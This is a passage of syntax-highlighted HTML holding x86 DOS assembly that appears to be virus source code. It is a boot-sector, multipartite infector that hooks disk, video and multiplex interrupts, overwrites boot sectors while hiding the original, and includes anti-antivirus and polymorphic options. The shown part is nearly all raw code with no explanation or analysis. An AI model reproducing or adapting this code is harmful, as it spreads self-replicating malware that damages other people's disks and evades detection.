        </span><span class="sc6">sti</span><span class="sc0">

        </span><span class="sc6">pushf</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">BOOT_OFFSET</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">COM_CODE_SECTOR</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">READ_A_SECTOR</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc5">PART_OFFSET</span><span class="sc4">+</span><span class="sc5">DESCRIPTOR_OFF</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc9">high</span><span class="sc4">(</span><span class="sc5">DESCRIPTOR</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc5">dh_value</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">NULL</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">DISK_INT</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">VIDEO_INT_ADDR</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">old_int_10_21</span><span class="sc4">-</span><span class="sc5">SET_INT_OFFSET</span><span class="sc4">+</span><span class="sc5">RELATIVE_BOOT</span><span class="sc4">+</span><span class="sc5">ONE_BYTE</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_n_set_int</span><span class="sc4">+</span><span class="sc5">ONE_BYTE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">low_code</span><span class="sc4">-</span><span class="sc5">TWO_BYTES</span><span class="sc4">+</span><span class="sc5">RELATIVE_OFFSET</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">LOW_JMP_10</span><span class="sc0">

        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">try_this_out</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">VIDEO_MODE</span><span class="sc4">],</span><span class="sc5">MONOCHROME</span><span class="sc0">

        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">try_this_out</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">DISK_INT_ADDR</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">MULTIPARTITE</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_both_ints</span><span class="sc0">

        </span><span class="sc9">ELSE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,(</span><span class="sc5">NEW_INT_13_LOOP</span><span class="sc4">*</span><span class="sc5">ADDR_MUL</span><span class="sc4">)-</span><span class="sc5">SET_INT_OFFSET</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_n_set_int</span><span class="sc4">+</span><span class="sc5">ONE_BYTE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc9">low</span><span class="sc4">(</span><span class="sc5">BIOS_INT_13</span><span class="sc4">*</span><span class="sc5">ADDR_MUL</span><span class="sc4">)-</span><span class="sc5">SET_INT_OFFSET</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_interrupt</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc9">high</span><span class="sc4">(</span><span class="sc5">COLOR_VIDEO_MEM</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">high_code</span><span class="sc4">+</span><span class="sc5">RELATIVE_OFFSET</span><span class="sc0">

</span><span class="sc5">try_this_out</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">full_move_w_si</span><span class="sc0">

        </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc5">initialize_boot</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc5">high_code</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int_10_start</span><span class="sc4">+</span><span class="sc5">RELATIVE_OFFSET</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">LOW_JMP_10</span><span class="sc4">-</span><span class="sc5">FAR_JUMP_OFFSET</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_int_10_21</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">VIDEO_INT_ADDR</span><span class="sc4">-</span><span class="sc5">SET_INT_OFFSET</span><span class="sc0">

</span><span class="sc5">low_code</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">OLD_BOOT_SECTOR</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">LOW_JMP_10</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_interrupt</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">BOOT_OFFSET</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">DISK_INT</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">BOOT_SECTOR</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">WRITE_A_SECTOR</span><span class="sc0">

</span><span class="sc5">high_code</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc5">interrupt_13</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">far</span><span class="sc0">

</span><span class="sc5">int_13_start</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">MULTIPARTITE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">drive_letter</span><span class="sc4">+</span><span class="sc5">ONE_BYTE</span><span class="sc4">+</span><span class="sc5">RELATIVE_OFFSET</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">BOOT_SECTOR</span><span class="sc0">

        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_boot_sector</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc9">high</span><span class="sc4">(</span><span class="sc5">READ_A_SECTOR</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_boot_sector</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">HD_0_HEAD_0</span><span class="sc0">

        </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">reread_boot</span><span class="sc0">

</span><span class="sc5">no_boot_sector</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">NEW_INT_13_LOOP</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">return_far</span><span class="sc0">

</span><span class="sc5">reread_boot</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">NEW_INT_13_LOOP</span><span class="sc0">

        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">return_far</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc5">check_old_boot</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">READ_A_SECTOR</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">OLD_BOOT_SECTOR</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">ANTI_ANTIVIRUS</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc12">'HC'</span><span class="sc0">

        </span><span class="sc9">ELSE</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc5">CLI_PUSHCS</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">read_old_boot</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc5">USING_HARD_DISK</span><span class="sc0">

        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">encode_hd</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">DESCRIPTOR_OFF</span><span class="sc4">-</span><span class="sc5">ONE_BYTE</span><span class="sc4">],</span><span class="sc5">DESCRIPTOR</span><span class="sc0">

        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">time_to_leave</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">NEW_INT_13_LOOP</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">ch</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">

        </span><span class="sc6">pushf</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">NEW_INT_13_LOOP</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">

        </span><span class="sc6">popf</span><span class="sc0">

        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">time_to_leave</span><span class="sc0">

</span><span class="sc5">encode_hd</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc9">high</span><span class="sc4">(</span><span class="sc5">WRITE_A_SECTOR</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">NEW_INT_13_LOOP</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">time_to_leave</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">move_code</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">COM_CODE_SECTOR</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">POLYMORPHIC</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">XOR_SWAP_OFFSET</span><span class="sc4">],</span><span class="sc8">dh</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">REMOVE_NOP</span><span class="sc0">

        </span><span class="sc6">jo</span><span class="sc0">  </span><span class="sc5">dont_flip_it</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">ROTATED_OFFSET</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">REMOVE_NOP</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">ROTATED_OFFSET</span><span class="sc4">+</span><span class="sc5">TWO_BYTES</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">REMOVE_NOP</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">ROTATED_OFFSET</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">REMOVE_NOP</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">dont_flip_it</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">NEW_INT_13_LOOP</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">move_some_more</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">DH_OFFSET</span><span class="sc4">],</span><span class="sc8">dh</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">REMOVE_NOP</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">NEW_INT_13_LOOP</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">check_old_boot</span><span class="sc0">

</span><span class="sc5">read_old_boot</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">DH_OFFSET</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">REMOVE_NOP</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">NEW_INT_13_LOOP</span><span class="sc0">

</span><span class="sc5">time_to_leave</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">

        </span><span class="sc6">clc</span><span class="sc0">

</span><span class="sc5">return_far</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc5">KEEP_CF_INTACT</span><span class="sc0">

</span><span class="sc5">interrupt_13</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc5">interrupt_2f</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">far</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">return_to_2f</span><span class="sc4">+</span><span class="sc5">RELATIVE_OFFSET</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">SAVE_INT_CHAIN</span><span class="sc4">-</span><span class="sc5">SET_INT_OFFSET</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">WINDOWS_END</span><span class="sc0">

        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">try_another</span><span class="sc0">

        </span><span class="sc6">les</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">SET_INT_OFFSET</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">set_13_chain</span><span class="sc0">

</span><span class="sc5">try_another</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">WINDOWS_BEGIN</span><span class="sc0">

        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">another_return</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">VIRGIN_INT_13_B</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_n_set_int</span><span class="sc4">+</span><span class="sc5">ONE_BYTE</span><span class="sc0">

        </span><span class="sc6">les</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">BIOS_INT_13</span><span class="sc4">*</span><span class="sc5">ADDR_MUL</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">set_13_chain</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">READ_A_SECTOR</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_set_part</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">VIRGIN_INT_13_B</span><span class="sc4">-</span><span class="sc5">SET_INT_OFFSET</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_interrupt</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc9">low</span><span class="sc4">(</span><span class="sc5">VIRGIN_INT_13_A</span><span class="sc4">-</span><span class="sc5">SET_INT_OFFSET</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_interrupt</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc9">high</span><span class="sc4">(</span><span class="sc5">WRITE_A_SECTOR</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">interrupt_2f</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc5">get_set_part</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">SCRATCH_AREA</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">HD_0_HEAD_0</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">NEW_INT_13_LOOP</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">READ_A_SECTOR</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">DISK_INT</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">

</span><span class="sc5">another_return</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">get_set_part</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc5">return_to_2f</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">far</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">original_2f_jmp</span><span class="sc0">

</span><span class="sc5">return_to_2f</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc5">interrupt_10</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">far</span><span class="sc0">

</span><span class="sc5">int_10_start</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pushf</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">a_return</span><span class="sc4">+</span><span class="sc5">RELATIVE_OFFSET</span><span class="sc0">

</span><span class="sc5">from_com_code</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">set_10_back</span><span class="sc0">

